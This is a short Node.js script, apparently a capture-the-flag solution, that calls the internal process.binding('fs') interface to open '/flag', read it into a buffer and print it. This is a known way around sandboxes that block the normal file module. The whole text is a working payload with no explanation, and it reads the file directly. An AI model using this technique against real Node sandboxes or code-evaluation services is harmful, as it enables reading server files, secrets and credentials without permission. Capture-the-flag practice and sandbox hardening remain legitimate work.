let f=process.binding('fs');
const d = f.open('/flag', 0, 438, undefined, { path: '/flag' });
let b = Buffer.allocUnsafe(200);
f.read(d, b, 0, 200, -1, undefined, {});
console.log(b.toString());